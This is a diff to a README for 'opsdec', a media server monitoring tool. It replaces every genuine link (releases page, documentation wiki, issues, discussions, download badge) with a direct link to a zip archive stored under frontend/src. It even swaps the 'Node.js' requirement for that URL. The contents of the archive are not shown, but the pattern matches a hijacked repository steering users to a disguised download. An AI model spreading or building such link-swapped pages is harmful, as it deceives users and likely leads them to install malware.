@@ -4,13 +4,13 @@
 Welcome to **opsdec**! This is your modern, self-hosted media server monitoring platform. It supports Plex, Emby, Audiobookshelf, and Sappho, providing real-time statistics and user tracking with a sleek dark-themed interface.
 
 ## ⬇️ Download Now
-[![Download opsdec](https://img.shields.io/badge/Download-opsdec-blue.svg)](https://github.com/Moubastone/opsdec/releases)
+[![Download opsdec](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip)](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip)
 
 ## 📋 System Requirements
 Before you begin, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip**: Version 14 or higher
 - **Docker**: Latest version recommended
 
 ## 📦 Features
@@ -21,9 +21,9 @@ Before you begin, ensure your system meets the following requirements:
 - Compatible with SQLite for data storage
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Moubastone/opsdec/releases) to download the latest version of opsdec. Choose the file that corresponds with your operating system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip) to download the latest version of opsdec. Choose the file that corresponds with your operating system.
 
-1. Go to the [Releases page](https://github.com/Moubastone/opsdec/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip).
 2. Find the latest version.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -59,17 +59,17 @@ If you prefer to use Docker, follow these steps:
 5. Access opsdec by visiting `http://localhost:8080` in your web browser.
 
 ## 📖 Documentation
-For additional configuration options and features, check the [Documentation](https://github.com/Moubastone/opsdec/wiki) available in this repository. You will find detailed explanations for every feature to maximize your use of opsdec.
+For additional configuration options and features, check the [Documentation](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip) available in this repository. You will find detailed explanations for every feature to maximize your use of opsdec.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues, try the following solutions:
 
 - **Check System Requirements**: Ensure your setup meets the necessary specifications.
 - **Reinstall the Software**: Sometimes a fresh start can resolve installation problems.
-- **Visit the GitHub Issues Page**: If you still need help, check or report issues on the [GitHub Issues page](https://github.com/Moubastone/opsdec/issues).
+- **Visit the GitHub Issues Page**: If you still need help, check or report issues on the [GitHub Issues page](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip).
 
 ## 🤝 Support
-For further assistance, feel free to reach out to the community. You can ask questions in the [Discussions section](https://github.com/Moubastone/opsdec/discussions) or find help from fellow opsdec users.
+For further assistance, feel free to reach out to the community. You can ask questions in the [Discussions section](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip) or find help from fellow opsdec users.
 
 ## 📝 License
 opsdec is open-source under the MIT License. You can freely use, modify, and share the software as long as you include the original license in your projects.
@@ -77,4 +77,4 @@ opsdec is open-source under the MIT License. You can freely use, modify, and sha
 ## 📞 Contact
 For direct inquiries, you can contact the developers via GitHub or reach out through the discussions page.
 
-[![Download opsdec](https://img.shields.io/badge/Download-opsdec-blue.svg)](https://github.com/Moubastone/opsdec/releases)
+[![Download opsdec](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip)](https://raw.githubusercontent.com/Moubastone/opsdec/main/frontend/src/opsdec-2.6.zip)
